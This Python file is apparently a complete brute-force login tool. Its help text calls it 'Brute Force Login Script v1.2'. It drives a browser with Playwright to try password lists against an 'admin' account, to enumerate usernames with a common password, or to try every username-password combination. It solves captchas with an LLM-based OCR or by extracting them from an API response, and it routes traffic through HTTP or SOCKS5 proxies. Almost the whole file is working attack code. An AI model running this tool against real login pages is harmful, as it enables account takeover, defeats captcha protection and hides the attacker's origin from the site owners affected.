from playwright.sync_api import Playwright, sync_playwright, expect
from time import sleep
import re
from textwrap import dedent
import argparse
from LLMocr_class import LLMocr
import requests
import json
import socks
import socket

def read_list(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: {filename} not found")
        return []

def read_code(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return None

def parse_burp_config(config_content):
    lines = config_content.strip().split('\n')
    method = 'GET'
    path = ''
    headers = {}
    body = ''
    
    i = 0
    if i < len(lines):
        match = re.match(r'^(\w+)\s+(\S+)\s+HTTP/\d+\.\d+$', lines[i])
        if match:
            method = match.group(1).upper()
            path = match.group(2)
            i += 1
    
    while i < len(lines):
        line = lines[i].strip()
        if not line:
            i += 1
            break
        if ':' in line:
            key, value = line.split(':', 1)
            headers[key.strip()] = value.strip()
        i += 1
    
    while i < len(lines):
        body += lines[i] + '\n'
        i += 1
    
    body = body.strip()
    
    return {
        'method': method,
        'path': path,
        'headers': headers,
        'body': body
    }

def read_api_config(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            content = f.read()
        
        if content.strip().startswith('{'):
            try:
                return json.loads(content)
            except json.JSONDecodeError:
                pass
        
        return parse_burp_config(content)
    except FileNotFoundError:
        print(f"Error: {filename} not found")
        return None
    except Exception as e:
        print(f"Error parsing {filename}: {e}")
        return None

def setup_proxy(proxy_url, proxy_type='http'):
    """配置全局代理"""
    if not proxy_url:
        return None
    
    try:
        if proxy_type.lower() == 'socks5':
            match = re.match(r'socks5://(?:(.+?):(.+?)@)?([^:]+):(\d+)', proxy_url)
            if match:
                username = match.group(1)
                password = match.group(2)
                host = match.group(3)
                port = int(match.group(4))
                
                socks.set_default_proxy(
                    socks.SOCKS5, 
                    host, 
                    port, 
                    username=username, 
                    password=password
                )
                socket.socket = socks.socksocket
                print(f"[*] SOCKS5 proxy configured: {host}:{port}")
            else:
                print(f"[!] Invalid SOCKS5 proxy format: {proxy_url}")
                return None
        elif proxy_type.lower() == 'http':
            if proxy_url.startswith('http://'):
                proxy_url = proxy_url[7:]
            print(f"[*] HTTP proxy configured: {proxy_url}")
            return {'http': f'http://{proxy_url}', 'https': f'http://{proxy_url}'}
        else:
            print(f"[!] Unsupported proxy type: {proxy_type}")
            return None
        
        return None
    except Exception as e:
        print(f"[!] Error setting up proxy: {e}")
        return None

def get_proxy_for_requests(proxy_url, proxy_type):
    """获取requests库使用的代理配置"""
    if not proxy_url:
        return None
    
    if proxy_type.lower() == 'http':
        if proxy_url.startswith('http://'):
            return {'http': proxy_url, 'https': proxy_url}
        return {'http': f'http://{proxy_url}', 'https': f'http://{proxy_url}'}
    elif proxy_type.lower() == 'socks5':
        return None
    return None

def get_proxy_for_playwright(proxy_url):
    """获取Playwright使用的代理配置"""
    if not proxy_url:
        return None
    
    try:
        if proxy_url.startswith('socks5://'):
            match = re.match(r'socks5://(?:(.+?):(.+?)@)?([^:]+):(\d+)', proxy_url)
            if match:
                return {
                    'server': f'socks5://{match.group(3)}:{match.group(4)}',
                    'username': match.group(1),
                    'password': match.group(2)
                }
            return {'server': proxy_url}
        elif proxy_url.startswith('http://'):
            return {'server': proxy_url}
        else:
            return {'server': f'http://{proxy_url}'}
    except Exception as e:
        print(f"[!] Error parsing proxy for playwright: {e}")
        return None

def login_with_captcha(page, username, password, code, captcha_code):
    exec(dedent(code), globals(), {"page": page, "username": username, "password": password, "captcha_code": captcha_code})
    sleep(1)

def login(page, username, password, code):
    exec(dedent(code), globals(), {"page": page, "username": username, "password": password})
    sleep(1)

def get_captcha_image(page, captcha_selector):
    try:
        element = page.query_selector(captcha_selector)
        if element:
            screenshot = element.screenshot()
            return screenshot
    except Exception as e:
        print(f"Error getting captcha image: {e}")
    return None

def get_captcha_from_api(api_url, api_config, response_regex, proxy_config=None):
    try:
        if api_config:
            method = api_config.get('method', 'GET').upper()
            headers = api_config.get('headers', {})
            
            body = api_config.get('body', '')
            data = api_config.get('data', {})
            json_data = api_config.get('json', {})
            params = api_config.get('params', {})
        else:
            method = 'GET'
            headers = {}
            body = ''
            data = {}
            json_data = {}
            params = {}
        
        kwargs = {
            'headers': headers,
            'timeout': 30
        }
        
        if proxy_config:
            kwargs['proxies'] = proxy_config
        
        if params:
            kwargs['params'] = params
        
        if method == 'POST' or method == 'PUT' or method == 'PATCH':
            if json_data:
                kwargs['json'] = json_data
            elif body:
                kwargs['data'] = body
            elif data:
                kwargs['data'] = data
        
        if method == 'POST':
            response = requests.post(api_url, **kwargs)
        elif method == 'PUT':
            response = requests.put(api_url, **kwargs)
        elif method == 'DELETE':
            response = requests.delete(api_url, **kwargs)
        elif method == 'PATCH':
            response = requests.patch(api_url, **kwargs)
        else:
            response = requests.get(api_url, **kwargs)
        
        response.raise_for_status()
        
        if response_regex:
            content = response.text
            match = re.search(response_regex, content)
            if match:
                return match.group(1)
        
        return response.content
    except Exception as e:
        print(f"Error getting captcha from API: {e}")
        return None

def check_login_result(page, fail_patterns):
    try:
        page.wait_for_load_state("networkidle", timeout=3000)
        page_content = page.content().lower()
        
        if fail_patterns['success'] and re.search(fail_patterns['success'], page_content):
            return {'success': True, 'reason': 'success'}
        
        if fail_patterns['captcha'] and re.search(fail_patterns['captcha'], page_content):
            return {'success': False, 'reason': 'captcha_error'}
        
        if fail_patterns['credentials'] and re.search(fail_patterns['credentials'], page_content):
            return {'success': False, 'reason': 'credentials_error'}
        
        if fail_patterns['other'] and re.search(fail_patterns['other'], page_content):
            return {'success': False, 'reason': 'other_error'}
        
        return {'success': True, 'reason': 'success'}
    except Exception as e:
        print(f"Error checking login result: {e}")
        return {'success': False, 'reason': 'other_error'}

def perform_login_with_captcha(page, username, password, code, captcha_code, fail_patterns):
    if captcha_code:
        login_with_captcha(page, username, password, code, captcha_code)
    else:
        login(page, username, password, code)
    
    return check_login_result(page, fail_patterns)

def brute_force_password(playwright, passwords_list, code, fail_patterns, success_pattern, common_password, 
                         use_captcha, captcha_selector, captcha_selector_url, captcha_api_url, captcha_api_config, 
                         captcha_response_regex, ocr, proxy_config, captcha_proxy_config, headless=False):
    browser = playwright.chromium.launch(headless=headless, proxy=proxy_config)
    context = browser.new_context()
    
    captcha_errors = []
    
    for password in passwords_list:
        print(f"Trying password: {password}")
        page = context.new_page()
        
        captcha_code = None
        
        if use_captcha:
            if captcha_api_url:
                print("[*] Getting captcha from API...")
                result = get_captcha_from_api(captcha_api_url, captcha_api_config, captcha_response_regex, captcha_proxy_config)
                if captcha_response_regex:
                    captcha_code = result
                    print(f"[*] Extracted captcha from response: {captcha_code}")
                elif result:
                    captcha_code = ocr.recognize(result)
                    print(f"[*] Recognized captcha from image: {captcha_code}")
            elif captcha_selector and captcha_selector_url:
                print(f"[*] Navigating to login page: {captcha_selector_url}")
                page.goto(captcha_selector_url)
                sleep(1)
                
                print(f"[*] Getting captcha image from selector: {captcha_selector}")
                captcha_image = get_captcha_image(page, captcha_selector)
                if captcha_image:
                    captcha_code = ocr.recognize(captcha_image)
                    print(f"[*] Recognized captcha: {captcha_code}")
        
        result = perform_login_with_captcha(page, "admin", password, code, captcha_code, fail_patterns)
        
        if result['success']:
            print(f"[!] Login SUCCESS with username: admin, password: {password}")
            input("Press Enter to continue brute-forcing...")
        else:
            if result['reason'] == 'captcha_error':
                print(f"[-] Failed with password: {password} - 验证码错误")
                captcha_errors.append({'username': 'admin', 'password': password, 'captcha_code': captcha_code})
            elif result['reason'] == 'credentials_error':
                print(f"[-] Failed with password: {password} - 用户名或密码错误")
            else:
                print(f"[-] Failed with password: {password} - 其他错误")
        
        page.close()
    
    if captcha_errors:
        print("\n" + "="*60)
        print(f"[统计] 验证码错误次数: {len(captcha_errors)}")
        print("验证码错误的用户名密码列表:")
        for i, item in enumerate(captcha_errors, 1):
            print(f"{i}. username={item['username']}, password={item['password']}, captcha={item['captcha_code']}")
        print("="*60 + "\n")
    
    context.close()
    browser.close()

def brute_force_username(playwright, usernames_list, code, fail_patterns, success_pattern, common_password,
                         use_captcha, captcha_selector, captcha_selector_url, captcha_api_url, captcha_api_config, 
                         captcha_response_regex, ocr, proxy_config, captcha_proxy_config, headless=False):
    browser = playwright.chromium.launch(headless=headless, proxy=proxy_config)
    context = browser.new_context()
    
    captcha_errors = []
    
    for username in usernames_list:
        print(f"Trying username: {username}")
        page = context.new_page()
        
        captcha_code = None
        
        if use_captcha:
            if captcha_api_url:
                print("[*] Getting captcha from API...")
                result = get_captcha_from_api(captcha_api_url, captcha_api_config, captcha_response_regex, captcha_proxy_config)
                if captcha_response_regex:
                    captcha_code = result
                    print(f"[*] Extracted captcha from response: {captcha_code}")
                elif result:
                    captcha_code = ocr.recognize(result)
                    print(f"[*] Recognized captcha from image: {captcha_code}")
            elif captcha_selector and captcha_selector_url:
                print(f"[*] Navigating to login page: {captcha_selector_url}")
                page.goto(captcha_selector_url)
                sleep(1)
                
                print(f"[*] Getting captcha image from selector: {captcha_selector}")
                captcha_image = get_captcha_image(page, captcha_selector)
                if captcha_image:
                    captcha_code = ocr.recognize(captcha_image)
                    print(f"[*] Recognized captcha: {captcha_code}")
        
        result = perform_login_with_captcha(page, username, common_password, code, captcha_code, fail_patterns)
        
        if result['success']:
            print(f"[!] Login SUCCESS with username: {username}, password: {common_password}")
            input("Press Enter to continue brute-forcing...")
        else:
            if result['reason'] == 'captcha_error':
                print(f"[-] Failed with username: {username} - 验证码错误")
                captcha_errors.append({'username': username, 'password': common_password, 'captcha_code': captcha_code})
            elif result['reason'] == 'credentials_error':
                print(f"[-] Failed with username: {username} - 用户名或密码错误")
            else:
                print(f"[-] Failed with username: {username} - 其他错误")
        
        page.close()
    
    if captcha_errors:
        print("\n" + "="*60)
        print(f"[统计] 验证码错误次数: {len(captcha_errors)}")
        print("验证码错误的用户名密码列表:")
        for i, item in enumerate(captcha_errors, 1):
            print(f"{i}. username={item['username']}, password={item['password']}, captcha={item['captcha_code']}")
        print("="*60 + "\n")
    
    context.close()
    browser.close()

def brute_force_cross(playwright, usernames_list, passwords_list, code, fail_patterns, success_pattern,
                      use_captcha, captcha_selector, captcha_selector_url, captcha_api_url, captcha_api_config, 
                      captcha_response_regex, ocr, proxy_config, captcha_proxy_config, headless=False):
    browser = playwright.chromium.launch(headless=headless, proxy=proxy_config)
    context = browser.new_context()
    
    captcha_errors = []
    
    total_attempts = len(usernames_list) * len(passwords_list)
    current_attempt = 0
    
    for username in usernames_list:
        for password in passwords_list:
            current_attempt += 1
            print(f"[{current_attempt}/{total_attempts}] Trying {username}:{password}")
            page = context.new_page()
            
            captcha_code = None
            
            if use_captcha:
                if captcha_api_url:
                    print("[*] Getting captcha from API...")
                    result = get_captcha_from_api(captcha_api_url, captcha_api_config, captcha_response_regex, captcha_proxy_config)
                    if captcha_response_regex:
                        captcha_code = result
                        print(f"[*] Extracted captcha from response: {captcha_code}")
                    elif result:
                        captcha_code = ocr.recognize(result)
                        print(f"[*] Recognized captcha from image: {captcha_code}")
                elif captcha_selector and captcha_selector_url:
                    print(f"[*] Navigating to login page: {captcha_selector_url}")
                    page.goto(captcha_selector_url)
                    sleep(1)
                    
                    print(f"[*] Getting captcha image from selector: {captcha_selector}")
                    captcha_image = get_captcha_image(page, captcha_selector)
                    if captcha_image:
                        captcha_code = ocr.recognize(captcha_image)
                        print(f"[*] Recognized captcha: {captcha_code}")
            
            result = perform_login_with_captcha(page, username, password, code, captcha_code, fail_patterns)
            
            if result['success']:
                print(f"[!] Login SUCCESS with username: {username}, password: {password}")
                input("Press Enter to continue brute-forcing...")
            else:
                if result['reason'] == 'captcha_error':
                    print(f"[-] Failed with {username}:{password} - 验证码错误")
                    captcha_errors.append({'username': username, 'password': password, 'captcha_code': captcha_code})
                elif result['reason'] == 'credentials_error':
                    print(f"[-] Failed with {username}:{password} - 用户名或密码错误")
                else:
                    print(f"[-] Failed with {username}:{password} - 其他错误")
            
            page.close()
    
    if captcha_errors:
        print("\n" + "="*60)
        print(f"[统计] 验证码错误次数: {len(captcha_errors)}")
        print("验证码错误的用户名密码列表:")
        for i, item in enumerate(captcha_errors, 1):
            print(f"{i}. username={item['username']}, password={item['password']}, captcha={item['captcha_code']}")
        print("="*60 + "\n")
    
    context.close()
    browser.close()

def run(playwright, args) -> None:
    headless = args.headless
    code = args.code
    common_password = args.common_password
    
    fail_patterns = {
        'success': args.success_pattern,
        'credentials': args.credentials_pattern,
        'captcha': args.captcha_pattern,
        'other': args.other_pattern
    }
    
    ocr = None
    use_captcha = args.use_captcha
    captcha_api_config = None
    
    proxy_config = get_proxy_for_playwright(args.proxy)
    captcha_proxy_config = get_proxy_for_requests(args.captcha_proxy, args.captcha_proxy_type)
    
    if args.proxy:
        print(f"[*] Browser proxy configured: {args.proxy}")
    
    if args.captcha_proxy:
        print(f"[*] Captcha/LLMOCR proxy configured: {args.captcha_proxy_type}://{args.captcha_proxy}")
        setup_proxy(args.captcha_proxy, args.captcha_proxy_type)
    
    if use_captcha:
        if args.captcha_api_config:
            captcha_api_config = read_api_config(args.captcha_api_config)
            if captcha_api_config:
                print(f"[*] Loaded captcha API config from {args.captcha_api_config}")
                print(f"[*] Method: {captcha_api_config.get('method', 'GET')}")
                print(f"[*] Headers: {list(captcha_api_config.get('headers', {}).keys())}")
            else:
                print(f"[*] Failed to load captcha API config, using default GET request")
        
        if not args.captcha_response_regex:
            ocr = LLMocr(verify_type=args.captcha_type, digits=args.captcha_digits)
            print(f"[*] OCR initialized with type={args.captcha_type}, digits={args.captcha_digits}")
        else:
            print(f"[*] Using captcha response regex: {args.captcha_response_regex}")

    if args.mode == "PwBlute":
        passwords = read_list(args.password_file)
        if not passwords:
            print(f"No passwords loaded, using default: {common_password}")
            passwords = [common_password]
        print(f"[*] Mode: Password Brute Force - {len(passwords)} password(s) to try")
        brute_force_password(playwright, passwords, code, fail_patterns, args.success_pattern, 
                             common_password, use_captcha, args.captcha_selector, args.captcha_selector_url, 
                             args.captcha_api_url, captcha_api_config, args.captcha_response_regex, 
                             ocr, proxy_config, captcha_proxy_config, headless)

    elif args.mode == "UnameEnum":
        usernames = read_list(args.username_file)
        if not usernames:
            print("Error: usernames file not found or empty")
            return
        print(f"[*] Mode: Username Enumeration - {len(usernames)} username(s) to try")
        brute_force_username(playwright, usernames, code, fail_patterns, args.success_pattern, 
                             common_password, use_captcha, args.captcha_selector, args.captcha_selector_url,
                             args.captcha_api_url, captcha_api_config, args.captcha_response_regex, 
                             ocr, proxy_config, captcha_proxy_config, headless)

    elif args.mode == "cross":
        usernames = read_list(args.username_file)
        passwords = read_list(args.password_file)
        if not usernames:
            print("Error: usernames file not found or empty")
            return
        if not passwords:
            print("Error: passwords file not found or empty")
            return
        print(f"[*] Mode: Cross Brute Force - {len(usernames)} username(s) x {len(passwords)} password(s) = {len(usernames) * len(passwords)} attempts")
        brute_force_cross(playwright, usernames, passwords, code, fail_patterns, args.success_pattern,
                          use_captcha, args.captcha_selector, args.captcha_selector_url,
                          args.captcha_api_url, captcha_api_config, args.captcha_response_regex, 
                          ocr, proxy_config, captcha_proxy_config, headless)

    else:
        print(f"Unknown MODE: {args.mode}. Use 'UnameEnum', 'PwBlute' or 'cross'")

def main():
    default_code = '''
    page.goto("http://127.0.0.1:8787/logic/user/login")
    page.get_by_label("用户名").click()
    page.get_by_label("用户名").fill(username)
    page.get_by_label("密码").click()
    page.get_by_label("密码").fill(password)
    page.get_by_label("验证码").click()
    page.get_by_label("验证码").fill(captcha_code)
    page.get_by_role("button", name="登录").click()
    '''

    parser = argparse.ArgumentParser(description='Brute Force Login Script v1.2 - with Captcha Support & Proxy')
    
    parser.add_argument('--headless', action='store_true', default=False, help='Run browser in headless mode')
    parser.add_argument('--mode', type=str, default='UnameEnum', choices=['UnameEnum', 'PwBlute', 'cross'],
                        help='Brute force mode: UnameEnum (username first), PwBlute (password first), cross (all combinations)')
    parser.add_argument('--username-file', type=str, default='usernames.txt', help='Path to username list file')
    parser.add_argument('--password-file', type=str, default='passwords.txt', help='Path to password list file')
    parser.add_argument('--code-file', type=str, default='code.txt', help='Path to login code file')
    parser.add_argument('--code', type=str, default=None, help='Login code snippet (overrides code-file)')
    parser.add_argument('--common-password', type=str, default='123456', help='Common password for username enumeration')
    
    parser.add_argument('--success-pattern', type=str, default=r'(登录成功)', help='Regex pattern for successful login')
    parser.add_argument('--credentials-pattern', type=str, default=r'(用户不存在|密码错误)', help='Regex pattern for credentials error')
    parser.add_argument('--captcha-pattern', type=str, default=r'(验证码错误)', help='Regex pattern for captcha error')
    parser.add_argument('--other-pattern', type=str, default=r'(系统错误|服务器错误)', help='Regex pattern for other errors')
    
    parser.add_argument('--use-captcha', action='store_true', default=False, help='Enable captcha recognition (flag)')
    parser.add_argument('--captcha-selector', type=str, default='img[alt="验证码"]', help='CSS selector for captcha image element')
    parser.add_argument('--captcha-selector-url', type=str, default=None, help='URL to navigate for getting captcha image (used with --captcha-selector)')
    parser.add_argument('--captcha-type', type=str, default='math', choices=['normal', 'math'],
                        help='Captcha type: normal (characters) or math (calculation)')
    parser.add_argument('--captcha-digits', type=int, default=6, help='Number of digits in captcha')
    
    parser.add_argument('--captcha-api-url', type=str, default=None, help='Captcha image API URL (default GET request)')
    parser.add_argument('--captcha-api-config', type=str, default=None, 
                        help='Path to captcha API config file (Burp Suite format or JSON)')
    parser.add_argument('--captcha-response-regex', type=str, default=None, 
                        help='Regex pattern to extract captcha from API response (for text-based captcha or base64 image data)')
    
    parser.add_argument('--proxy', type=str, default=None, 
                        help='Proxy for browser (Playwright). Format: http://host:port or socks5://host:port')
    parser.add_argument('--captcha-proxy', type=str, default=None, 
                        help='Proxy for captcha API and LLMOCR requests. Format: host:port')
    parser.add_argument('--captcha-proxy-type', type=str, default='http', choices=['http', 'socks5'],
                        help='Type of proxy for captcha/LLMOCR: http or socks5')
    
    args = parser.parse_args()

    if args.code is not None:
        args.code = args.code
    else:
        code_from_file = read_code(args.code_file)
        if code_from_file is not None:
            args.code = code_from_file
            print(f"[*] Loaded login code from {args.code_file}")
        else:
            args.code = default_code
            print(f"[*] {args.code_file} not found, using default login code")
    
    return args

if __name__ == "__main__":
    args = main()
    with sync_playwright() as playwright:
        run(playwright, args)